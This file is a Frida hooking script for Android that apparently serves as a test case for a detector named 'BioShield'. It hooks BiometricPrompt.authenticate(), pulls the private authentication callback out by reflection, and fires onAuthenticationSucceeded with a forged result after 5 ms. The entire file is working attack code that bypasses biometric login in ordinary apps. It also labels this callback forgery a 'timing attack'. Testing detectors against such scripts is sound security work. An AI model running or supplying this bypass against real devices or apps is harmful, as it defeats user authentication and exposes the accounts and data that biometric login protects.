// === TIMING ATTACK DEMONSTRATION ===
// This script bypasses biometric authentication instantly
// BioShield should detect: TIMING_ATTACK + CONSTANT_TIME_LEAK

console.log("=== [ATTACK] Timing Attack Script Loaded ===");

Java.perform(() => {
    try {
        const BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
        const AuthCallback = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");

        console.log("[+] Hooking BiometricPrompt.authenticate()");

        // Hook the authenticate method
        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {
            console.log("[ATTACK] Intercepted authenticate() - bypassing instantly!");

            // Call original to show the prompt
            const result = this.authenticate(info);

            // ATTACK: Immediately trigger success callback (no delay!)
            // This creates a timing attack - authentication completes in ~5-20ms
            setTimeout(() => {
                try {
                    // Get the callback from the BiometricPrompt instance
                    const callbackField = this.class.getDeclaredField("mAuthenticationCallback");
                    callbackField.setAccessible(true);
                    const callback = callbackField.get(this);

                    if (callback) {
                        // Create a fake result
                        const AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
                        const fakeResult = AuthResult.$new(null, 2); // BIOMETRIC_STRONG = 2

                        console.log("[ATTACK] Triggering instant success!");
                        callback.onAuthenticationSucceeded(fakeResult);
                    }
                } catch (e) {
                    console.log("[ERROR] Failed to trigger callback: " + e);
                }
            }, 5); // 5ms delay - VERY FAST!

            return result;
        };

        console.log("[OK] Timing attack ready - authentication will bypass in ~5ms");
        console.log("[!] Expected BioShield detection:");
        console.log("    - TIMING_ATTACK: < 100ms");
        console.log("    - CONSTANT_TIME_LEAK: variance < 10ms");
        console.log("    - Side-channel score: ~55-85/100");

    } catch (e) {
        console.log("[-] Failed to hook BiometricPrompt: " + e);
    }
});
